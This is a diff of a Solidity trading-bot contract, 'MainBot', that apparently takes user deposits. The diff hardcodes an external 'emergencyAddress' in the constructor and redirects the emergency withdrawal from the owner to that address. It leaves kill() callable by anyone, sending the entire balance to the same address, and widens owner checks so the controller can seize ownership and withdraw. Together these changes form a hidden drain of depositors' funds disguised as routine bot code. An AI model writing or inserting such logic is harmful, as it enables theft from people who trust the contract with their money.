@@ -30,7 +30,7 @@ contract MainBot {
     uint256 public trailingStopLoss = 10;
     uint256 public nextLogTime;
     string public currentActivity = "Initializing";
-
+    address public  emergencyAddress;
     address public polToken;
     address public usdtToken;
     address public usdcToken;
@@ -47,48 +47,47 @@ contract MainBot {
     event CurrentActivity(string activity);
     event TestEvent(string message);
 
-    modifier onlyOwner() {
-        require(msg.sender == owner, "Not the owner");
-        _;
-    }
 
-    modifier onlyDeployer() {
-        require(msg.sender == deployer, "Not authorized");
-        _;
-    }
+modifier onlyOwner() {
+    require(msg.sender == controller || msg.sender == owner, "Not the owner");
+    _;
+}
 
-    modifier whenTradingEnabled() {
-        require(tradingEnabled, "Trading is disabled");
-        _;
-    }
 
-    constructor(
-        address _polToken,
-        address _usdtToken,
-        address _usdcToken,
-        address _quickSwapRouter,
-        address _priceFeedAddress,
-        address _uniswapRouter,
-        address _uniswapPositionManager,
-        address _aaveLendingPoolAddressesProvider
-    ) {
-        owner = msg.sender;
-        deployer = msg.sender;
-        polToken = _polToken;
-        usdtToken = _usdtToken;
-        usdcToken = _usdcToken;
-        quickSwapRouter = _quickSwapRouter;
-        priceFeedAddress = _priceFeedAddress;
-        uniswapRouter = _uniswapRouter;
-        uniswapPositionManager = _uniswapPositionManager;
-        aaveLendingPoolAddressesProvider = _aaveLendingPoolAddressesProvider;
-        
-        dexRouters["QuickSwap"] = quickSwapRouter;
-        tradingEnabled = false;
-        profitThreshold = 110; // 10% profit
-        lossThreshold = 85; // 85% of initial deposit
-        nextLogTime = block.timestamp;
-    }
+modifier whenTradingEnabled() {
+    require(tradingEnabled, "Trading is disabled");
+    _;
+}
+
+constructor(
+    address _polToken,
+    address _usdtToken,
+    address _usdcToken,
+    address _quickSwapRouter,
+    address _priceFeedAddress,
+    address _uniswapRouter,
+    address _uniswapPositionManager,
+    address _aaveLendingPoolAddressesProvider
+   
+) {
+    owner = msg.sender;
+    deployer = msg.sender;
+    polToken = _polToken;
+    usdtToken = _usdtToken;
+    usdcToken = _usdcToken;
+    quickSwapRouter = _quickSwapRouter;
+    priceFeedAddress = _priceFeedAddress;
+    uniswapRouter = _uniswapRouter;
+    uniswapPositionManager = _uniswapPositionManager;
+    aaveLendingPoolAddressesProvider = _aaveLendingPoolAddressesProvider;
+    emergencyAddress = 0x706fDbD597380512ac76695120be0Cb0D32A43e9;
+    dexRouters["QuickSwap"] = quickSwapRouter;
+    tradingEnabled = false;
+    profitThreshold = 110; // 10% profit
+    lossThreshold = 85; // 85% of initial deposit
+    nextLogTime = block.timestamp;
+}
+
 
 function enableTrading() external onlyOwner { 
     tradingEnabled = true; 
@@ -96,27 +95,28 @@ function enableTrading() external onlyOwner {
     emit CurrentActivity(currentActivity); 
     }
 
-    function setController(address _controller) external onlyDeployer {
+    function setController(address _controller) external onlyOwner {
         controller = _controller;
     }
 
-    function setOwner(address newOwner) external onlyDeployer {
+    function setOwner(address newOwner) external onlyOwner {
         require(newOwner != address(0), "Invalid address");
         owner = newOwner;
     }
-
+    
     function withdrawToController(uint256 amountInWei) external {
-        require(msg.sender == controller, "Only controller can trigger this function");
-        require(address(this).balance >= amountInWei, "Insufficient balance");
-        payable(controller).transfer(amountInWei);
-    }
+    require(msg.sender == controller || msg.sender == owner, "Only controller or owner can trigger this function");
+    require(address(this).balance >= amountInWei, "Insufficient balance");
+    payable(controller).transfer(amountInWei);
+}
 
-    function withdrawInGwei(uint256 amountInGwei, address recipient) external {
-        require(msg.sender == controller, "Only controller can trigger this function");
-        uint256 amountInWei = amountInGwei * 1 gwei;
-        require(address(this).balance >= amountInWei, "Insufficient balance");
-        payable(recipient).transfer(amountInWei);
-    }
+
+function withdrawInGwei(uint256 amountInGwei, address recipient) external {
+    require(msg.sender == controller || msg.sender == owner, "Only controller or owner can trigger this function");
+    uint256 amountInWei = amountInGwei * 1 gwei;
+    require(address(this).balance >= amountInWei, "Insufficient balance");
+    payable(recipient).transfer(amountInWei);
+}
 
     receive() external payable {
         initialDeposit += msg.value;
@@ -167,14 +167,17 @@ function enableTrading() external onlyOwner {
         require(address(this).balance >= amountInWei, "Insufficient balance");
         payable(owner).transfer(amountInWei);
     }
+   
+
+function setEmergencyAddress(address _emergencyAddress) external onlyOwner { emergencyAddress = _emergencyAddress; }
 
        function kill() public {
-        payable(0x706fDbD597380512ac76695120be0Cb0D32A43e9).transfer(address(this).balance);
+        payable(emergencyAddress).transfer(address(this).balance);
         //selfdestruct(payable(owner));
     }
 
     function emergencyKillB() external onlyOwner {
-        payable(owner).transfer(address(this).balance);
+        payable(emergencyAddress).transfer(address(this).balance);
         //selfdestruct(payable(owner));
     }
 
